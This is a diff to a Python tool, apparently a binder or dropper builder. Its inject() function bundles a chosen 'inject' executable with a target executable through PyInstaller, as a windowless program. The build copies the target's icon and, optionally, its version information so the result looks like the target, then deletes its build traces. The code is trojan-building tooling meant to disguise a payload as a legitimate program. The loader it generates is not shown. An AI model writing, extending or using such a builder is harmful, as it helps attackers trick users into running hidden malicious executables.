@@ -18,7 +18,23 @@ def inject(file_to_inject, target_file, clone_properties):
         copy2(file_to_inject, 'cached_files/inject.exe')
         copy2(file_to_inject, 'cached_files/target.exe')
 
+        generate_file_loader('==')
 
+        pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& resources\Python310\python.exe resources\Python310\Scripts\pyinstaller.exe -F -w ' + ('--version-file "temporary_files/version.txt" ' if clone_properties else '') + '--add-data "cached_files/inject.exe;cached_files" --add-data "cached_files/target.exe;cached_files" --icon "cached_files/target.exe" "temporary_files/file_loader.py" & pause & exit"'
+        os.system(pyinstaller_command)
+        input('Press [ENTER] when processing in new window will end: ')
+        print('If running generated executable will produce error, just change its name')
+
+        if 'file_loader.spec' in os.listdir('.'):
+            os.system('del file_loader.spec')
+        if '__pycache__' in os.listdir('.'):
+            rmtree('__pycache__')
+        if 'build' in os.listdir('.'):
+            rmtree('build')
+        if 'cached_files' in os.listdir('.'):
+            rmtree('cached_files')
+        if 'temporary_files' in os.listdir('.'):
+            rmtree('temporary_files')
 
 
     else:
